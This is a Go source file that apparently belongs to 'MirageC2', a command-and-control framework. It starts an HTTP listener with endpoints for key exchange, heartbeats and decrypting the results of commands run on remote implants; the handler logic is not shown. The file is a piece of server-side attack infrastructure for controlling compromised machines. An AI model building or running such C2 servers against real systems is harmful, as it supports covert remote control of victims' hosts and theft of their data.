package webstart

import (
	"MirageC2_V1.0/app/exchange"
	"MirageC2_V1.0/public/common"
	"context"
	"fmt"
	"net/http"
	"strconv"
	"time"
)

func MirageServer(ip string, id string, ctx context.Context) {
	mux := http.NewServeMux()
	intID, _ := strconv.Atoi(id)
	config := &common.MConfig
	job := &common.Jobs[intID-1]
	// ######################## 交换秘钥页面 #############################
	SwitchKeyUri := config.SwitchKeyUri
	Originalkey := exchange.RandomOriginalkey()
	mux.HandleFunc(SwitchKeyUri, func(w http.ResponseWriter, r *http.Request) {
		SwitchKey(w, r, Originalkey)
	})
	job.Key = exchange.Cryptokey(Originalkey)

	// ######################### 命令执行结果解密 ###########################

	DeResultUri := config.ResultUri
	mux.HandleFunc(DeResultUri, func(w http.ResponseWriter, r *http.Request) {
		DeResult(w, r, intID)
	})

	// ######################## 心跳检测页面 #############################
	HeartbeatUri := config.HeartbeatUri
	checkInterval := time.Duration(job.Sleep) * time.Second
	mux.HandleFunc(HeartbeatUri, func(w http.ResponseWriter, r *http.Request) {
		Heartbeat(w, r, intID, checkInterval)
	})

	// ######################## 命令执行任务池 #############################

	server := http.Server{
		Addr:    ip,
		Handler: mux,
	}

	go func() {
		if err := server.ListenAndServe(); err != http.ErrServerClosed {
			fmt.Printf("[-] Error starting server: %v\n", err)
			job.Status = false
		}
	}()
	<-ctx.Done()
	fmt.Println("[+] Stopping Listen:", job.IPort)
	server.Shutdown(context.Background())
}
